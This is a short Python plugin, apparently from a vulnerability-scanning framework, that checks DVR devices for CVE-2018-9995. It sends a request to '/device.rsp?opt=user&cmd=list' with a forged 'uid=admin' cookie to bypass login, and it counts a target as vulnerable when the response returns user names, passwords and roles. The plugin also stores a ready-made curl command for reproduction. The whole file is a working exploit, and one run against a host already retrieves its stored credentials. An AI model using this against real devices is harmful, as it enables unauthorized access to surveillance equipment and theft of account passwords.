#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = "https://blog.51cto.com/superwolf/2124467"
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "DVR登陆绕过(CVE-2018-9995)漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {
          'User-Agent'    : ua,
          "Accept"        : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Languag": "es-AR,en-US;q=0.7,en;q=0.3",
          "Connection"    : "close",
          "Content-Type"  : "text/html",
          "Cookie"        : "uid=admin"
      }
  target = '/device.rsp?opt=user&cmd=list'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=15,verify=False)
    if res.status_code == 200 and re.search(r'result.*?list.*?uid.*?pwd.*?role.*?mac.*?playback',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      ret['huixian'] = f'curl "{url1}" -H "Cookie:uid=admin"'
      return ret
    else:
      return ret
  except:
    return ret